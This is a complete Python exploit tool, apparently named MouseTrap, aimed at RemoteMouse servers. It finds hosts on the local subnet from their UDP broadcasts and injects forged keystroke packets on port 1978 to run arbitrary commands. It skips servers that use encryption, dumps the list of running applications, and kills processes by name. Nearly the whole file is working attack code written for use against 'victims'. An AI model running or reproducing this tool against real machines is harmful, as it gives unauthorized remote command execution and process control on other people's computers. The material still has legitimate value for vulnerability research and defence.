"""
MouseTrap - Send exploit payloads to RemoteMouse servers (https://www.remotemouse.net/)
Author: Axel Persinger
License: MIT License
"""


"""
Imported Libraries

argparse - Argument parser library
socket - Socket I/O library to send payloads with
enum - Create special character enum
re - Regex library for parsing commands
time - Sleep for offsets
os - Create directories
werkzeug.utils - Safe filenames
json - JSON I/O
base64 - B64 encode binary data
"""
import argparse
import socket
import enum
import re
import time
import os
import werkzeug.utils
import json
import base64


"""
Global Variables

re_keycodes - Compiled regex to extract keycodes from commands
"""
re_keycodes = re.compile(r"(\[.*?\])")


class Keycodes(enum.Enum):
    """
    Enum holding the special character keycode string representations
    """
    ENTER = "RTN"
    BAS = "BAS"
    ALT = "ALT"
    CTRL = "CTRL"
    SHIFT = "SHIFT"
    CMD = "CMD"
    WIN = "WIN"
    TAB = "TAB"
    ESC = "ESC"
    HOME = "HOME"
    INSERT = "INSERT"
    DELETE = "DELETE"
    END = "END"
    PAGE_UP = "PAGE_UP"
    PAGE_DOWN = "PAGE_DOWN"
    BACK = "BACK"
    PAUSE = "PAUSE"
    SPACE = "SPACE"
    UP = "UP"
    DOWN = "DOWN"
    LEFT = "LEFT"
    RIGHT = "RIGHT"
    LWIN = "LWIN"
    RWIN = "RWIN"
    F1 = "F1"
    F2 = "F2"
    F3 = "F3"
    F4 = "F4"
    F5 = "F5"
    F6 = "F6"
    F7 = "F7"
    F8 = "F8"
    F9 = "F9"
    F10 = "F10"
    F11 = "F11"
    F12 = "F12"


def _success(msg: str):
    """
    Prints out a SUCCESS msg to the console

    :param msg: msg to display
    :type msg: str
    """
    print("[+] SUCCESS:", msg)


def _info(msg: str):
    """
    Prints out an INFO msg to the console

    :param msg: msg to display
    :type msg: str
    """
    print("[*] INFO:", msg)


def _error(msg: str):
    """
    Prints out an ERROR msg to the console

    :param msg: msg to display
    :type msg: str
    """
    print("[!] ERROR:", msg)


def char2pkt(s: str) -> str:
    """
    Converts an individual character into the full single-character injection packet

    :param s: character to inject
    :type s: str
    :return: packet
    :rtype: str
    """
    i = ord(s) ^ 53
    rhs = "[ras]{}".format(i)
    return "key  {}{}".format(len(rhs), rhs)


def special2pkt(kc: Keycodes) -> str:
    """
    Converts a special character (ENTER, Win, etc.) to a packet.
    This function does NOT validate the special character string is correct.

    :param s: keycode
    :type s: str
    :return: packet
    :rtype: str
    """
    return "key  {}{}".format(len(kc.value), kc.value)


def combo2pkt(s: str, kc: Keycodes) -> str:
    """
    Generates a packet for key combinations (i.e. CTRL+SHIFT+ESC)

    :param s: base key
    :type s: str
    :param kc: modifier keycodes
    :type kc: Keycodes
    :return: [packet
    :rtype: str
    """
    if len(s) != 1:
        s = Keycodes[s].value
    if not isinstance(kc, list):
        kc = [kc]
    modifiers = '[*]'+'[*]'.join([k.value for k in kc])
    rhs = "[kld]{}{}".format(s, modifiers)
    return "key {}{}".format(len(rhs), rhs)


def parse_cmd(s: str) -> list:
    """
    Parse a command and create the injection packets.
    For special characters, wrap the string (That exists inside of Keycodes) inside `[]`.
    For key combinations, warp them inside of `[]` and separate them with `+`.

    :param s: command to execute
    :type s: str
    :return: List of injection ready packets
    :rtype: list
    """
    pkts = []
    for tok in re.split(re_keycodes, s): # Split the command string into "tokens" (basically text by itself, but things in square brackets in their own element)
        if not (tok.startswith('[') and tok.endswith(']')): # if it's just a plain substring, not a special command
            pkts += [char2pkt(c) for c in tok] # Add the individual character packets
            continue
        
        
        if '+' in tok: # If it's a combo special command
            cmds = tok[1:-1].split('+') # Split the command on the +
            parsed_cmds = [Keycodes[cmd] if cmd in Keycodes.__members__ else cmd for cmd in cmds] # Convert the necessary commands into keycodes
            pkts.append(combo2pkt(parsed_cmds[-1], parsed_cmds[:-1])) # Create the command packet
            continue
        
        pkts.append(special2pkt(Keycodes[tok[1:-1]])) # Otherwise it's an individual command, just convert it and add

    return pkts


def discover_targets() -> list:
    """
    Discovers targets by listening to the UDP broadcasts. Listens until it receives SIGINT

    :return: List of IP Addresses
    :rtype: list
    """
    _info("Listening to UDP port 2007 until SIGINT...")
    targets = []
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', 2007))

    try:
        while True:
            host = sock.recv(20).decode('ascii', errors='ignore')[5:]
            ip = socket.gethostbyname(host)
            if ip in targets:
                continue
            
            targets.append(ip)
            _success("Received broadcast from {} ({})".format(ip, host))
    
    except KeyboardInterrupt:
        pass
    
    finally:
        return targets
    

def send_exploit(pkts: list, target_ip: str, key: str = '') -> None:
    """
    Sends the exploit across the wire

    :param pkts: List of strings containing the packet data to send to victim
    :type pkts: list
    :param target_ip: IP Addr of the victim
    :type pkts: str
    :param key: Hash to prepend
    :type key: str
    """
    _info("Sending exploit to {}".format(target_ip))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for pkt in pkts:
        time.sleep(0.08)
        _info("Sending '{}'".format(pkt))
        sock.sendto(key.encode('utf-8') + pkt.encode('utf-8'), (target_ip, 1978))


def target_encrypted(target_ip: str) -> bool:
    """
    Checks if the target is using encryption

    :param target_ip: Target IP running the server
    :type target_ip: str
    :return: True or false
    :rtype: bool
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, 1978))
    return b'pwd pwd' in s.recv(1024)


def get_appdata(target_ip: str) -> dict:
    """
    Gets application data broadcasted by the server

    :param target_ip: IP address for the target
    :type target_ip: str
    :return: Application data dict
    :rtype: dict
    """
    apps = []
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, 1979))
    s.settimeout(0.5)
    
    # Send application request
    s.send(b'act')

    try:    
        while True:
            dok = s.recv(3) # Receive the OK
            if dok != b'dok':
                _error("Server did not acknolwedge request for applications")
                break

            buff_len = int.from_bytes(s.recv(4), 'little') # Get the length of the application information buffer    
            buff = s.recv(buff_len) # Download the acutal buffer

            app = {
                'name': buff[:256].replace(b'\x00', b''),
                'path': buff[256:1280].replace(b'\x00', b''),
                'status': bool(int.from_bytes(buff[1280:1281], 'little')),
                'windowhandle': int.from_bytes(buff[1281:1285], 'little'),
                'intPre2': int.from_bytes(buff[1285:1289], 'little'), # not used by server
                'bPre1': bool(int.from_bytes(buff[1289:1290], 'little')), # not used by server
                'bPre2': bool(int.from_bytes(buff[1290:1291], 'little')), # not used by server
                'icon_length': int.from_bytes(buff[1291:1295], 'little')
            }
            app['icon'] = s.recv(app['icon_length']) # Get the icon

            # Convert binary fields to B64
            app['name'] = base64.b64encode(app['name']).decode('ascii')
            app['path'] = base64.b64encode(app['path']).decode('ascii')
            app['icon'] = base64.b64encode(app['icon']).decode('ascii')
            apps.append(app)

            _success("Received the \"{}\" application from {}".format(base64.b64decode(app['path']).decode(), target_ip))
    except socket.timeout:
        pass
    finally:
        return apps


def dump_appdata(appdata: dict, target_ip: str) -> None:
    """
    Dumps application data to directory

    :param appdata: appdata from server
    :type appdata: dict
    :param target_ip: IP address for the target
    :type target_ip: str
    """
    if not os.path.isdir(target_ip):
        os.mkdir(target_ip)
    
    with open(target_ip+'/manifest.json', 'w') as f:
        json.dump(appdata, f)
    
    for idx, app in enumerate(appdata):
        with open(target_ip+'/app{}.png'.format(idx), 'wb') as f: # Write the PNG to file
            f.write(base64.b64decode(app['icon']))
    
    _success("Dumped applications from {}".format(target_ip))


def close_process(target_ip: str, proc_name: str) -> None:
    """
    Kill the process via the name

    :param target_ip: Target
    :type target_ip: str
    :param proc_name: Process name to kill
    :type proc_name: str
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, 1979))
    s.send('clo{:03d}{}'.format(len(proc_name), proc_name).encode())
    _success("Killed {} on {}".format(proc_name, target_ip))
    

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--os', type=str, action='store', choices=('MacOS', 'Windows'), help="Signals what OS the target is running")
    parser.add_argument('--cmd', type=str, action='store', help="Command to execute")
    # parser.add_argument('--troll', type=str, action='store', choices=('delete',), help="Adds what trolling features you want to implement")
    parser.add_argument('--targets', type=str, action='store', default='-', help="Comma delimited list of targets, '-' if you want to target all IP addresses on the subnet")
    parser.add_argument('--hashes', type=str, action='store', default='', help="Comma delimited list of hashes that line up with the targets")
    parser.add_argument('--close-process', type=str, action='store', help="Process name to kill on target(s)")
    parser.add_argument('--skip-encrypted', action='store_true', default=True, help="Skip the encrypted targets")
    parser.add_argument('--dump-apps', action='store_true', help="Dumps apps advertised by the server")
    args = parser.parse_args()

    if args.os == 'MacOS':
        raise NotImplementedError("MacOS targets aren't implemented yet")

    if args.targets == '-':
        args.targets = discover_targets()
    else:
        args.targets = args.targets.split(',')
    
    args.hashes = args.hashes.split(',')
    if args.hashes != [''] and len(args.hashes) != len(args.targets):
        raise ValueError("Number of hashes does not equal number of targets")

    if args.cmd:
        cmd_pkts = parse_cmd(args.cmd)
    for target in args.targets:
        
        if args.dump_apps:
            _info("Dumping application data from {}".format(target))
            appdata = get_appdata(target)
            dump_appdata(appdata, target)
        
        if args.close_process:
            close_process(target, args.close_process)
        
        encrypted = target_encrypted(target)
        if args.skip_encrypted and encrypted:
            _info("Skipping {} because of encryption".format(target))
            continue
        
        if args.cmd:
            _info("Executing '{}' against {} running on {} ({})".format(args.cmd, target, args.os, 'Encrypted session' if encrypted else 'Unencrypted session'))
            send_exploit(cmd_pkts, target)
        

if __name__ == "__main__":
    main()
